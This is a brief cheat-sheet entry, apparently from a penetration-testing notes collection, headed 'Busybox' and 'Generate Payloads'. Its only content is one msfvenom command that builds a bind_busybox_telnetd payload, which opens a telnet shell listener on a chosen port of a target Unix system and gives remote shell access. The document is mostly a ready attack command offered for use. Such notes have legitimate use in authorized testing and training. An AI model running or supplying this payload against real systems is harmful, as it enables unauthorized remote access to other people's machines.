# Busybox

## 01 - Generate Payloads

```
$ msfvenom -p cmd/unix/bind_busybox_telnetd lport=<PORT>
```